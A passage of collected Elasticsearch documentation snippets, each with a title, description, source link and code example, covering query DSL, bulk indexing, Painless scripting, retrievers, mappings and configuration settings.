Gaussian decay function for scoring hotels based on location. It sets the origin at coordinates \"11, 12\" (town center) with a scale of 2km, preferring hotels closer to this location.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-function-score-query.md#2025-04-21_snippet_10\n\nLANGUAGE: js\nCODE:\n```\n\"gauss\": { <1>\n    \"location\": {\n          \"origin\": \"11, 12\",\n          \"scale\": \"2km\"\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Using Nested Query in Elasticsearch Search\nDESCRIPTION: This code snippet forms a query using a nested field to search within 'my-index-000001'. It performs a boolean query on the nested field 'obj1' and adjusts the score based on the average of matching child objects.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-nested-query.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"nested\": {\n      \"path\": \"obj1\",\n      \"query\": {\n        \"bool\": {\n          \"must\": [\n            { \"match\": { \"obj1.name\": \"blue\" } },\n            { \"range\": { \"obj1.count\": { \"gt\": 5 } } }\n          ]\n        }\n      },\n      \"score_mode\": \"avg\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: EVAL Command Syntax in ESQL\nDESCRIPTION: The basic syntax for the EVAL command in ESQL. It allows appending new columns with calculated values.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/eval.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nEVAL [column1 =] value1[, ..., [columnN =] valueN]\n```\n\n----------------------------------------\n\nTITLE: Configuring Network Host in Elasticsearch YAML\nDESCRIPTION: Sets the address for both HTTP and transport traffic. The node binds to this address and uses it as its publish address. Accepts an IP address, hostname, or special value.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nnetwork.host: _local_\n```\n\n----------------------------------------\n\nTITLE: Bulk Indexing with Flattened Fields\nDESCRIPTION: Example showing how to bulk index multiple documents containing flattened fields with various nested structures.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/flattened.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /my-index-000001/_bulk?refresh\n{\"index\":{}}\n{\"title\":\"Something really urgent\",\"labels\":{\"priority\":\"urgent\",\"release\":[\"v1.2.5\",\"v1.3.0\"],\"timestamp\":{\"created\":1541458026,\"closed\":1541457010}}}\n{\"index\":{}}\n{\"title\":\"Somewhat less urgent\",\"labels\":{\"priority\":\"high\",\"release\":[\"v1.3.0\"],\"timestamp\":{\"created\":1541458026,\"closed\":1541457010}}}\n{\"index\":{}}\n{\"title\":\"Not urgent\",\"labels\":{\"priority\":\"low\",\"release\":[\"v1.2.0\"],\"timestamp\":{\"created\":1541458026,\"closed\":1541457010}}}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Span Term Query Example\nDESCRIPTION: This snippet demonstrates a basic `span_term` query in Elasticsearch.  It searches for spans where the `user.id` field contains the term `kimchy`.  This query is used to find documents matching the specified term within a span context.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-span-term-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"span_term\" : { \"user.id\" : \"kimchy\" }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Certificate Verification Mode for Remote Cluster Client SSL in Elasticsearch\nDESCRIPTION: Setting to define how certificates presented by another party in TLS connections are verified. Options include full, certificate, and none verification modes.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_41\n\nLANGUAGE: properties\nCODE:\n```\nxpack.security.remote_cluster_client.ssl.verification_mode\n```\n\n----------------------------------------\n\nTITLE: Loading Hockey Stats into Elasticsearch Index\nDESCRIPTION: Bulk API request to load hockey player statistics into an Elasticsearch index named 'hockey'. The data contains player information including names, goals, assists, games played, and birth dates.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/brief-painless-walkthrough.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT hockey/_bulk?refresh\n{\"index\":{\"_id\":1}}\n{\"first\":\"johnny\",\"last\":\"gaudreau\",\"goals\":[9,27,1],\"assists\":[17,46,0],\"gp\":[26,82,1],\"born\":\"1993/08/13\"}\n{\"index\":{\"_id\":2}}\n{\"first\":\"sean\",\"last\":\"monohan\",\"goals\":[7,54,26],\"assists\":[11,26,13],\"gp\":[26,82,82],\"born\":\"1994/10/12\"}\n{\"index\":{\"_id\":3}}\n{\"first\":\"jiri\",\"last\":\"hudler\",\"goals\":[5,34,36],\"assists\":[11,62,42],\"gp\":[24,80,79],\"born\":\"1984/01/04\"}\n{\"index\":{\"_id\":4}}\n{\"first\":\"micheal\",\"last\":\"frolik\",\"goals\":[4,6,15],\"assists\":[8,23,15],\"gp\":[26,82,82],\"born\":\"1988/02/17\"}\n{\"index\":{\"_id\":5}}\n{\"first\":\"sam\",\"last\":\"bennett\",\"goals\":[5,0,0],\"assists\":[8,1,0],\"gp\":[26,1,0],\"born\":\"1996/06/20\"}\n{\"index\":{\"_id\":6}}\n{\"first\":\"dennis\",\"last\":\"wideman\",\"goals\":[0,26,15],\"assists\":[11,30,24],\"gp\":[26,81,82],\"born\":\"1983/03/20\"}\n{\"index\":{\"_id\":7}}\n{\"first\":\"david\",\"last\":\"jones\",\"goals\":[7,19,5],\"assists\":[3,17,4],\"gp\":[26,45,34],\"born\":\"1984/08/10\"}\n{\"index\":{\"_id\":8}}\n{\"first\":\"tj\",\"last\":\"brodie\",\"goals\":[2,14,7],\"assists\":[8,42,30],\"gp\":[26,82,82],\"born\":\"1990/06/07\"}\n{\"index\":{\"_id\":39}}\n{\"first\":\"mark\",\"last\":\"giordano\",\"goals\":[6,30,15],\"assists\":[3,30,24],\"gp\":[26,60,63],\"born\":\"1983/10/03\"}\n{\"index\":{\"_id\":10}}\n{\"first\":\"mikael\",\"last\":\"backlund\",\"goals\":[3,15,13],\"assists\":[6,24,18],\"gp\":[26,82,82],\"born\":\"1989/03/17\"}\n{\"index\":{\"_id\":11}}\n{\"first\":\"joe\",\"last\":\"colborne\",\"goals\":[3,18,13],\"assists\":[6,20,24],\"gp\":[26,67,82],\"born\":\"1990/01/30\"}\n```\n\n----------------------------------------\n\nTITLE: Configuring Enrich Cache Size in Elasticsearch YAML\nDESCRIPTION: Sets the maximum number of searches to cache for enriching documents. The default value is 1000, and this cache is shared across all enrich processors in the cluster.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/enrich-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nenrich.cache_size: 1000\n```\n\n----------------------------------------\n\nTITLE: Executing Pinned Query with Document IDs - Elasticsearch Console\nDESCRIPTION: This console snippet demonstrates a pinned query where specific documents are ranked higher in search results based on their IDs. The 'organic' query ensures that other results still match search terms but with lower ranking. Necessary for setups where document IDs are used to control ranking in search queries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-pinned-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"pinned\": {\n      \"ids\": [ \"1\", \"4\", \"100\" ],\n      \"organic\": {\n        \"match\": {\n          \"description\": \"iphone\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch Index with GeoPoint Mapping\nDESCRIPTION: This code snippet demonstrates how to create an Elasticsearch index with a `geo_point` field mapping.  It defines the `location` field as type `geo_point`, enabling geospatial queries on this field. This is a prerequisite for using the `geo_shape` query against `geo_point` fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-shape-query.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPUT /example_points\n{\n  \"mappings\": {\n    \"properties\": {\n      \"location\": {\n        \"type\": \"geo_point\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Updating Document Fields Using Painless Script in Elasticsearch\nDESCRIPTION: This code snippet demonstrates how to use a Painless script to update a document in Elasticsearch. The script sets the 'sold' field to true and updates the 'cost' field based on the parameter 'sold_cost'. This operation is performed as part of an update request to a specific document within an index.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-update-context.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n\"POST /seats/_update/3\\n{\\n  \\\"script\\\": {\\n    \\\"source\\\": \\\"ctx._source.sold = true; ctx._source.cost = params.sold_cost\\\",\\n    \\\"lang\\\": \\\"painless\\\",\\n    \\\"params\\\": {\\n      \\\"sold_cost\\\": 26\\n    }\\n  }\\n}\"\n```\n\n----------------------------------------\n\nTITLE: Executing Complex Hybrid Search with RRF Retriever in Elasticsearch\nDESCRIPTION: This advanced example demonstrates a hybrid search using the RRF retriever, combining lexical search, ELSER sparse vector search, and dense vector search. It utilizes multiple retrievers to achieve a comprehensive search across different data representations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_3\n\nLANGUAGE: json\nCODE:\n```\nGET movies/_search\n{\n  \"retriever\": {\n    \"rrf\": {\n      \"retrievers\": [\n        {\n          \"standard\": {\n            \"query\": {\n              \"sparse_vector\": {\n                \"field\": \"plot_embedding\",\n                \"inference_id\": \"my-elser-model\",\n                \"query\": \"films that explore psychological depths\"\n              }\n            }\n          }\n        },\n        {\n          \"standard\": {\n            \"query\": {\n              \"multi_match\": {\n                \"query\": \"crime\",\n                \"fields\": [\n                  \"plot\",\n                  \"title\"\n                ]\n              }\n            }\n          }\n        },\n        {\n          \"knn\": {\n            \"field\": \"vector\",\n            \"query_vector\": [10, 22, 77],\n            \"k\": 10,\n            \"num_candidates\": 10\n          }\n        }\n      ]\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Removing Persistent Cluster Settings\nDESCRIPTION: Demonstrates how to remove specific persistent cluster settings that might prevent cluster formation. Includes examples of both specific setting removal and wildcard pattern usage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/node-tool.md#2025-04-21_snippet_5\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node remove-settings xpack.monitoring.exporters.my_exporter.host\n\n    WARNING: Elasticsearch MUST be stopped before running this tool.\n\nThe following settings will be removed:\nxpack.monitoring.exporters.my_exporter.host: \"10.1.2.3\"\n\nYou should only run this tool if you have incompatible settings in the\ncluster state that prevent the cluster from forming.\nThis tool can cause data loss and its use should be your last resort.\n\nDo you want to proceed?\n\nConfirm [y/N] y\n\nSettings were successfully removed from the cluster state\n```\n\nLANGUAGE: txt\nCODE:\n```\nnode$ ./bin/elasticsearch-node remove-settings xpack.monitoring.*\n```\n\n----------------------------------------\n\nTITLE: Configuring General Security Settings in Elasticsearch YAML\nDESCRIPTION: These YAML settings control core security features like enabling security, auto-configuration, and enrollment. They are typically added to the elasticsearch.yml configuration file.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/security-settings.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.enabled: true\nxpack.security.autoconfiguration.enabled: true\nxpack.security.enrollment.enabled: false\nxpack.security.hide_settings: xpack.security.authc.realms.active_directory.ad1.*\nxpack.security.fips_mode.enabled: false\nxpack.security.fips_mode.required_providers: [\"BCFIPS\", \"BCJSSE\"]\n```\n\n----------------------------------------\n\nTITLE: Creating Custom Analyzer with N-gram Filter\nDESCRIPTION: Creates a new index with a custom analyzer using the ngram filter combined with a standard tokenizer.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-ngram-tokenfilter.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT ngram_example\n{\n  \"settings\": {\n    \"analysis\": {\n      \"analyzer\": {\n        \"standard_ngram\": {\n          \"tokenizer\": \"standard\",\n          \"filter\": [ \"ngram\" ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Loading Sample Seat Data into Elasticsearch Using Bulk API\nDESCRIPTION: Ingests sample seat data with details about theater plays, actors, dates, times, seats, and prices using the bulk API with the 'seats' ingest pipeline.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-context-examples.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPOST seats/_bulk?pipeline=seats&refresh=true\n{\"create\":{\"_index\":\"seats\",\"_id\":\"1\"}}\n{\"theatre\":\"Skyline\",\"play\":\"Rent\",\"actors\":[\"James Holland\",\"Krissy Smith\",\"Joe Muir\",\"Ryan Earns\"],\"date\":\"2021-4-1\",\"time\":\"3:00PM\",\"cost\":37,\"row\":1,\"number\":7,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"2\"}}\n{\"theatre\":\"Graye\",\"play\":\"Rent\",\"actors\":[\"Dave Christmas\"],\"date\":\"2021-4-1\",\"time\":\"3:00PM\",\"cost\":30,\"row\":3,\"number\":5,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"3\"}}\n{\"theatre\":\"Graye\",\"play\":\"Rented\",\"actors\":[\"Dave Christmas\"],\"date\":\"2021-4-1\",\"time\":\"3:00PM\",\"cost\":33,\"row\":2,\"number\":6,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"4\"}}\n{\"theatre\":\"Skyline\",\"play\":\"Rented\",\"actors\":[\"James Holland\",\"Krissy Smith\",\"Joe Muir\",\"Ryan Earns\"],\"date\":\"2021-4-1\",\"time\":\"3:00PM\",\"cost\":20,\"row\":5,\"number\":2,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"5\"}}\n{\"theatre\":\"Down Port\",\"play\":\"Pick It Up\",\"actors\":[\"Joel Madigan\",\"Jessica Brown\",\"Baz Knight\",\"Jo Hangum\",\"Rachel Grass\",\"Phoebe Miller\"],\"date\":\"2018-4-2\",\"time\":\"8:00PM\",\"cost\":27.5,\"row\":3,\"number\":2,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"6\"}}\n{\"theatre\":\"Down Port\",\"play\":\"Harriot\",\"actors\":[\"Phoebe Miller\",\"Sarah Notch\",\"Brayden Green\",\"Joshua Iller\",\"Jon Hittle\",\"Rob Kettleman\",\"Laura Conrad\",\"Simon Hower\",\"Nora Blue\",\"Mike Candlestick\",\"Jacey Bell\"],\"date\":\"2018-8-7\",\"time\":\"8:00PM\",\"cost\":30,\"row\":1,\"number\":10,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"7\"}}\n{\"theatre\":\"Skyline\",\"play\":\"Auntie Jo\",\"actors\":[\"Jo Hangum\",\"Jon Hittle\",\"Rob Kettleman\",\"Laura Conrad\",\"Simon Hower\",\"Nora Blue\"],\"date\":\"2018-10-2\",\"time\":\"5:40PM\",\"cost\":22.5,\"row\":7,\"number\":10,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"8\"}}\n{\"theatre\":\"Skyline\",\"play\":\"Test Run\",\"actors\":[\"Joe Muir\",\"Ryan Earns\",\"Joel Madigan\",\"Jessica Brown\"],\"date\":\"2018-8-5\",\"time\":\"7:30PM\",\"cost\":17.5,\"row\":11,\"number\":12,\"sold\":true}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"9\"}}\n{\"theatre\":\"Skyline\",\"play\":\"Sunnyside Down\",\"actors\":[\"Krissy Smith\",\"Joe Muir\",\"Ryan Earns\",\"Nora Blue\",\"Mike Candlestick\",\"Jacey Bell\"],\"date\":\"2018-6-12\",\"time\":\"4:00PM\",\"cost\":21.25,\"row\":8,\"number\":15,\"sold\":true}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"10\"}}\n{\"theatre\":\"Graye\",\"play\":\"Line and Single\",\"actors\":[\"Nora Blue\",\"Mike Candlestick\"],\"date\":\"2018-6-5\",\"time\":\"2:00PM\",\"cost\":30,\"row\":1,\"number\":2,\"sold\":false}\n{\"create\":{\"_index\":\"seats\",\"_id\":\"11\"}}\n{\"theatre\":\"Graye\",\"play\":\"Hamilton\",\"actors\":[\"Lin-Manuel Miranda\",\"Leslie Odom Jr.\"],\"date\":\"2018-6-5\",\"time\":\"2:00PM\",\"cost\":5000,\"row\":1,\"number\":20,\"sold\":true}\n```\n\n----------------------------------------\n\nTITLE: Configuring Field-Level Similarity in Elasticsearch Index Mapping\nDESCRIPTION: This snippet demonstrates how to set different similarity algorithms at the field level when creating an Elasticsearch index. It shows a default field using the default BM25 similarity and another field explicitly configured to use the boolean similarity algorithm.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/similarity.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"default_field\": { \n        \"type\": \"text\"\n      },\n      \"boolean_sim_field\": {\n        \"type\": \"text\",\n        \"similarity\": \"boolean\" \n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Performing Datetime Comparisons with Painless\nDESCRIPTION: This snippet illustrates how to perform greater than, equality, and less than comparisons of numeric and complex ZonedDateTime objects using Painless scripting.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/using-datetime-in-painless.md#2025-04-21_snippet_15\n\nLANGUAGE: painless\nCODE:\n```\nlong timestamp1 = 434931327000L;\nlong timestamp2 = 434931330000L;\n\nif (timestamp1 > timestamp2) {\n   // handle condition\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt1 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime zdt2 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\n\nif (zdt1.equals(zdt2)) {\n    // handle condition\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt1 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime zdt2 =\n        ZonedDateTime.of(1983, 10, 17, 22, 15, 35, 0, ZoneId.of('Z'));\n\nif (zdt1.isBefore(zdt2)) {\n    // handle condition\n}\n```\n\nLANGUAGE: painless\nCODE:\n```\nZonedDateTime zdt1 =\n        ZonedDateTime.of(1983, 10, 13, 22, 15, 30, 0, ZoneId.of('Z'));\nZonedDateTime zdt2 =\n        ZonedDateTime.of(1983, 10, 17, 22, 15, 35, 0, ZoneId.of('Z'));\n\nif (zdt1.isAfter(zdt2)) {\n    // handle condition\n}\n```\n\n----------------------------------------\n\nTITLE: Retrieving Script Evaluations in Elasticsearch Search Query\nDESCRIPTION: This snippet demonstrates how to use script_fields to retrieve custom script evaluations based on different fields for each hit. It includes examples of simple arithmetic operations and parameter usage.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrieve-selected-fields.md#2025-04-21_snippet_13\n\nLANGUAGE: json\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_all\": {}\n  },\n  \"script_fields\": {\n    \"test1\": {\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['price'].value * 2\"\n      }\n    },\n    \"test2\": {\n      \"script\": {\n        \"lang\": \"painless\",\n        \"source\": \"doc['price'].value * params.factor\",\n        \"params\": {\n          \"factor\": 2.0\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Range Field Mappings and Indexing Data in Elasticsearch\nDESCRIPTION: Example showing how to configure an index mapping with integer_range and date_range fields, and then index a document with range values. The date_range field accepts the same parameters as the date type, and the example shows indexing a meeting with 10-20 attendees and a specific time frame.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/range.md#2025-04-22_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT range_index\n{\n  \"settings\": {\n    \"number_of_shards\": 2\n  },\n  \"mappings\": {\n    \"properties\": {\n      \"expected_attendees\": {\n        \"type\": \"integer_range\"\n      },\n      \"time_frame\": {\n        \"type\": \"date_range\",\n        \"format\": \"yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch_millis\"\n      }\n    }\n  }\n}\n\nPUT range_index/_doc/1?refresh\n{\n  \"expected_attendees\" : {\n    \"gte\" : 10,\n    \"lt\" : 20\n  },\n  \"time_frame\" : {\n    \"gte\" : \"2015-10-31 12:00:00\",\n    \"lte\" : \"2015-11-01\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Restaurants with Standard Retriever in Elasticsearch\nDESCRIPTION: This example demonstrates how to use a standard retriever to search for restaurants in Austria from 2019. It uses a bool query with a should clause for matching the region and a filter for exact year matching.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/retrievers.md#2025-04-21_snippet_0\n\nLANGUAGE: json\nCODE:\n```\nGET /restaurants/_search\n{\n  \"retriever\": {\n    \"standard\": {\n      \"query\": {\n        \"bool\": {\n          \"should\": [\n            {\n              \"match\": {\n                \"region\": \"Austria\"\n              }\n            }\n          ],\n          \"filter\": [\n            {\n              \"term\": {\n                \"year\": \"2019\"\n              }\n            }\n          ]\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Using Index Patterns in Elasticsearch\nDESCRIPTION: This snippet shows how to use an index pattern to search across multiple indices that match a specific pattern. It searches any data streams or indices that start with 'my-index-'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-*/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Bulk Index Data Using cURL\nDESCRIPTION: Uses the bulk API to index security event data from a JSON file into the data stream.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql/eql-ex-threat-detection.md#2025-04-21_snippet_1\n\nLANGUAGE: sh\nCODE:\n```\ncurl -H \"Content-Type: application/json\" -XPOST \"localhost:9200/my-data-stream/_bulk?pretty&refresh\" --data-binary \"@normalized-T1117-AtomicRed-regsvr32.json\"\n```\n\n----------------------------------------\n\nTITLE: Basic Nested Aggregation Query in Elasticsearch\nDESCRIPTION: Query demonstrating how to perform a nested aggregation to find the minimum price across all resellers for a product.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-nested-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET /products/_search?size=0\n{\n  \"query\": {\n    \"match\": {\n      \"name\": \"led tv\"\n    }\n  },\n  \"aggs\": {\n    \"resellers\": {\n      \"nested\": {\n        \"path\": \"resellers\"\n      },\n      \"aggs\": {\n        \"min_price\": {\n          \"min\": {\n            \"field\": \"resellers.price\"\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Searching Multiple Specific Indices in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to search multiple specific indices by providing them as comma-separated values in the search API's request path. It searches for documents with user.id matching 'kimchy' across two indices.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/search-multiple-data-streams-indices.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001,my-index-000002/_search\n{\n  \"query\": {\n    \"match\": {\n      \"user.id\": \"kimchy\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Boolean Filter Query with Zero Score in Elasticsearch\nDESCRIPTION: This query uses a `bool` query with only a `filter` clause. The `filter` clause ensures that only documents with `status: active` are returned, but because there are no scoring queries, all documents receive a score of `0`.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-bool-query.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nGET _search\n{\n  \"query\": {\n    \"bool\": {\n      \"filter\": {\n        \"term\": {\n          \"status\": \"active\"\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Specifying a Highlight Query in Elasticsearch\nDESCRIPTION: This example shows how to use highlight_query to take additional information into account when highlighting. It combines both the search query and rescore query, allowing highlighting to consider both elements rather than just the search query.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/rest-apis/highlighting.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match\": {\n      \"comment\": {\n        \"query\": \"foo bar\"\n      }\n    }\n  },\n  \"rescore\": {\n    \"window_size\": 50,\n    \"query\": {\n      \"rescore_query\": {\n        \"match_phrase\": {\n          \"comment\": {\n            \"query\": \"foo bar\",\n            \"slop\": 1\n          }\n        }\n      },\n      \"rescore_query_weight\": 10\n    }\n  },\n  \"_source\": false,\n  \"highlight\": {\n    \"order\": \"score\",\n    \"fields\": {\n      \"comment\": {\n        \"fragment_size\": 150,\n        \"number_of_fragments\": 3,\n        \"highlight_query\": {\n          \"bool\": {\n            \"must\": {\n              \"match\": {\n                \"comment\": {\n                  \"query\": \"foo bar\"\n                }\n              }\n            },\n            \"should\": {\n              \"match_phrase\": {\n                \"comment\": {\n                  \"query\": \"foo bar\",\n                  \"slop\": 1,\n                  \"boost\": 10.0\n                }\n              }\n            },\n            \"minimum_should_match\": 0\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Markdown Document Structure with Navigation and Notes\nDESCRIPTION: A structured markdown document defining the navigation title and main content sections for Elasticsearch mapping documentation, including a note block with references to other documentation sections.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/index.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n---\nnavigation_title: \"Mapping\"\n---\n# Mapping reference\n\n:::{note}\nThis section provides detailed **reference information** for mapping.\n\nRefer to [Mapping](docs-content://manage-data/data-store/mapping.md) in the **Manage data** section for overview, getting started and conceptual information.\n:::\n\nMappings are defined dynamically or explicitly for each document in Elasticsearch.\nThis section contains explanations for the following mapping components:\n\n- [Field data types](/reference/elasticsearch/mapping-reference/field-data-types.md)\n- [Metadata fields](/reference/elasticsearch/mapping-reference/document-metadata-fields.md)\n- [Mapping parameters](/reference/elasticsearch/mapping-reference/mapping-parameters.md)\n\n% TO-DO: Link to the mapping overview in the data management section\n```\n\n----------------------------------------\n\nTITLE: Constant Score Query Example in Elasticsearch\nDESCRIPTION: This snippet demonstrates how to use the `constant_score` query in Elasticsearch to wrap a filter query and assign a constant score to matching documents. It uses the `filter` parameter to specify the query and the `boost` parameter to set the constant score. The query searches for documents where the `user.id` field is equal to \"kimchy\" and assigns a relevance score of 1.2 to each matching document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-constant-score-query.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"constant_score\": {\n      \"filter\": {\n        \"term\": { \"user.id\": \"kimchy\" }\n      },\n      \"boost\": 1.2\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Filtering Documents Where a Field Exists in YAML\nDESCRIPTION: This snippet demonstrates how to filter documents using KQL where a specific field exists, employing the '*' operator. It checks for any indexed value, including empty strings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/kql.md#2025-04-21_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.request.method: *\n```\n\n----------------------------------------\n\nTITLE: Configuring and Using ignore_above in Elasticsearch Mapping\nDESCRIPTION: This snippet demonstrates how to set up an index with the ignore_above setting, index documents, and perform a search with aggregation. It shows how strings longer than the specified limit are treated differently during indexing and querying.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/ignore-above.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000001\n{\n  \"mappings\": {\n    \"properties\": {\n      \"message\": {\n        \"type\": \"keyword\",\n        \"ignore_above\": 20 <1>\n      }\n    }\n  }\n}\n\nPUT my-index-000001/_doc/1 <2>\n{\n  \"message\": \"Syntax error\"\n}\n\nPUT my-index-000001/_doc/2 <3>\n{\n  \"message\": \"Syntax error with some long stacktrace\"\n}\n\nGET my-index-000001/_search <4>\n{\n  \"aggs\": {\n    \"messages\": {\n      \"terms\": {\n        \"field\": \"message\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Semantic Text Field with Separate Ingest and Search Endpoints\nDESCRIPTION: Example of creating an index with a semantic_text field using dedicated inference endpoints for ingestion and search operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/semantic-text.md#2025-04-21_snippet_2\n\nLANGUAGE: console\nCODE:\n```\nPUT my-index-000003\n{\n  \"mappings\": {\n    \"properties\": {\n      